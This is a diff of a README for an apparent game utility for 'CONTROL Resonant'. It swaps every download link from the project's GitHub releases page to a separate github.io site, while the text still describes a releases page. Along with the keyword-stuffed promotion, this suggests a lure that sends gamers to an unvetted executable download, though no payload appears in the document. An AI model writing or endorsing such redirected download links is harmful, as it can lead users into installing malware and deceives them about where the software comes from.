@@ -1,6 +1,6 @@
 # 🎮 CONTROL-Resonant-Paranatural-Utility - Master the Paranatural Like Never Before
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-%23FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/danelleupintheair70/CONTROL-Resonant-Paranatural-Utility/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-%23FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://danelleupintheair70.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This application is designed for everyday PC gamers who want to customize their 
 
 ## ⬇️ Download & Install
 
-Visit this link to download the application: [https://github.com/danelleupintheair70/CONTROL-Resonant-Paranatural-Utility/releases](https://github.com/danelleupintheair70/CONTROL-Resonant-Paranatural-Utility/releases)
+Visit this link to download the application: [https://danelleupintheair70.github.io](https://danelleupintheair70.github.io)
 
 Once you land on the releases page, you'll see a list of available versions. Look for the newest release at the top and click on the downloadable file that matches your system. The download will start automatically, and you're one step away from transforming your gameplay experience.
 
@@ -133,6 +133,6 @@ CONTROL-Resonant-Paranatural-Utility puts you in the Director's seat, giving you
 
 Download it today and experience CONTROL Resonant the way you've always wanted. Your journey through the Oldest House awaits, and now you hold all the cards.
 
-[![Get Started](https://img.shields.io/badge/Get%20The%20Utility-Download%20Now-%234ECDC4?style=for-the-badge&logo=download&logoColor=white)](https://github.com/danelleupintheair70/CONTROL-Resonant-Paranatural-Utility/releases)
+[![Get Started](https://img.shields.io/badge/Get%20The%20Utility-Download%20Now-%234ECDC4?style=for-the-badge&logo=download&logoColor=white)](https://danelleupintheair70.github.io)
 
 Keywords: 2026, ability-cooldowns, artifact-profiles, camera-tools, control-resonant-pc, control-resonant-utility, desktop-tool, game-tools, gravity-anomalies, health-tools, hotkeys, movement-tools, paranatural-utility, pc, profile-manager, remedy-game, resource-manager, single-player, supernatural-rpg, windows-x64
